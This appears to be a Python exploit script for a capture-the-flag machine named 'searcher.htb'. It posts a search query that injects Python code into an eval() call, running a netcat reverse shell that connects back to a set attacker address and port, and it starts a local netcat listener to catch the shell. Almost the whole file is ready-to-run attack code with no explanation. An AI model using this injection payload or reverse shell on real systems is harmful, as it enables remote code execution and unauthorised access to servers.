import requests
import sys
import multiprocessing
import os


#Change This
LHOST = '10.10.16.7'
LPORT = '443'

def exploit():
	#Don't forget to add machine ip to /etc/hosts
	url = "http://searcher.htb:80/search"
	headers = { 
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
 			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  			"Accept-Language": "en-US,en;q=0.5",
  			"Accept-Encoding": "gzip, deflate",
    		"Content-Type": "application/x-www-form-urlencoded", 
     		"Connection": "close",  
     		"Upgrade-Insecure-Requests": "1"
     	  }
   	#Using Netcat OpenBSD Reverse Shell 
	nc_openBSD = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f'
	exploit = f"dd'),eval(\"__import__('os').system('{nc_openBSD}')\"),'anything'#"
	
	data = {"engine": "Amazon", "query": exploit}
	r = requests.post(url, headers=headers, data=data)

#Nc listener on local machine
def listen(lport):
	os.system(f'nc -nlvp {lport}')


exploit()
if __name__ == '__main__': 
	#Start nc listener
	listen = multiprocessing.Process(target=listen, args=(LPORT,))
	listen.start()
	#Exploit
	exploit()
	#join shell process
	listen.join()